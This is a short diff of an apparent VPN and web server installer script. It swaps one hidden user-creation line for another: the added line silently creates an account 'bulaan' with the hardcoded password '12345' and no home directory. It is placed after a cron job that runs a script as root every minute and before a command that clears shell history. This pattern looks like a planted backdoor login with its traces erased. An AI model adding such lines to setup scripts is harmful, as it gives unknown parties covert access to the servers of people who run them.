@@ -1164,7 +1164,6 @@ update-rc.d openvpn enable
 update-rc.d apache2 enable
 service apache2 restart
 service openvpn restart
- /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
 systemctl start hysteria-server.service
 systemctl enable hysteria-server.service
 echo "Installing iptables."
@@ -1205,6 +1204,8 @@ bash /home/deleted.sh
 EOF
 
 echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+ /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulaan
 
 history -c
 cd /root || exit
